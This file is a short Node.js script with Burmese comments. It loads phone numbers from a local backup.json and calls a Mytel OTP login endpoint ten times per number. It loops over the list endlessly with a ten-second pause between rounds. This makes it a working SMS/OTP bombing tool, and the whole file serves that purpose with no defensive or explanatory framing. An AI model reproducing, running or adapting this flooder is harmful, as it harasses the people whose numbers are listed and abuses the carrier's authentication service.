const axios = require("axios");
const fs = require("fs");

// 🔄 backup.json ထဲက ဖုန်းနံပါတ် load function
function loadPhones() {
  try {
    const data = fs.readFileSync("backup.json", "utf8");
    return JSON.parse(data);
  } catch (e) {
    console.error("❌ Error reading backup.json:", e.message);
    return [];
  }
}

// 📤 OTP ပို့ function
async function sendOtp(phone) {
  for (let i = 0; i < 10; i++) {
    try {
      const url = `https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber=${phone}`;
      const res = await axios.get(url);
      if (res.status === 200) {
        console.log(`✅ (${i + 1}/10) OTP sent to ${phone}`);
      } else {
        console.log(`⚠️ (${i + 1}/10) Failed for ${phone}: Status ${res.status}`);
      }
    } catch (e) {
      console.error(`❌ (${i + 1}/10) OTP error for ${phone}: ${e.message}`);
    }
  }
}

// 🔁 Loop forever
async function startLoop() {
  while (true) {
    const phoneList = loadPhones();
    if (phoneList.length === 0) {
      console.log("❌ No phone numbers in backup.json. Waiting 10s before retry...");
      await new Promise(r => setTimeout(r, 10000));
      continue;
    }

    for (const user of phoneList) {
      await sendOtp(user.phone);
    }

    console.log("🔁 All phone numbers done. Looping again in 10 seconds...\n");
    await new Promise(r => setTimeout(r, 10000));
  }
}

startLoop();
